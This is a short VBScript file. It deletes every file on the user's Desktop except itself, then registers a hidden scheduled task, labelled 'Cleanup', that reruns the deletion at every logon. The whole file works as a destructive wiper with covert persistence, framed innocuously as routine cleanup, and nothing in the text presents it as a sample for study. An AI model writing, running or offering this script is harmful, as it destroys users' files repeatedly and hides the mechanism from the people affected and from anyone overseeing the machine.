Option Explicit

Dim objFSO, objFolder, objFile, objShell, strDesktop, strScript

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the Desktop folder
strDesktop = WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop")
Set objFolder = objFSO.GetFolder(strDesktop)

' Get the VBScript filename
strScript = WScript.ScriptFullName

' Loop through each file in the Desktop folder and delete it, except for the VBScript file
For Each objFile In objFolder.Files
    If LCase(objFSO.GetExtensionName(objFile.Name)) <> "vbs" Or LCase(objFile.Name) <> LCase(objFSO.GetFileName(strScript)) Then
        objFSO.DeleteFile(objFile)
    End If
Next

Set objFile = Nothing
Set objFolder = Nothing
Set objFSO = Nothing

Set objShell = CreateObject("WScript.Shell")

' Create a Task Scheduler task to run the VBScript on user logon
Dim objTaskService, objTaskDefinition, objTrigger, objAction

Set objTaskService = CreateObject("Schedule.Service")
objTaskService.Connect
Set objTaskDefinition = objTaskService.NewTask(0)

' Set the task settings
objTaskDefinition.RegistrationInfo.Description = "Run cleanup.vbs on user logon"
objTaskDefinition.Settings.Enabled = True
objTaskDefinition.Settings.Hidden = True
objTaskDefinition.Settings.DisallowStartIfOnBatteries = False
objTaskDefinition.Settings.StopIfGoingOnBatteries = False

' Set the trigger to run on user logon
Set objTrigger = objTaskDefinition.Triggers.Create(9)
objTrigger.StartBoundary = "2010-01-01T00:00:00"
objTrigger.Enabled = True

' Set the action to run the VBScript file
Set objAction = objTaskDefinition.Actions.Create(0)
objAction.Path = "wscript.exe"
objAction.Arguments = Chr(34) & strScript & Chr(34)

' Register the task and exit
objTaskService.GetFolder("\").RegisterTaskDefinition "Cleanup", objTaskDefinition
WScript.Quit()
